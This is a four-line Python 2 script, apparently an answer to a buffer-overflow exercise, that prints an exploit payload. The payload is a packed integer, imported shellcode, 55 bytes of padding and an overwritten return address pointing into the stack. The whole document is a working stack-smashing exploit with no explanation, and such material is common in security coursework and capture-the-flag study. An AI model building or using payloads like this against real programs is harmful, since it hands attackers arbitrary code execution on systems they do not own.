from shellcode import shellcode
from struct import pack

print pack("<I", 0x4000000e) + shellcode + "a"*55 + pack("<I", 0xbffeafb0)
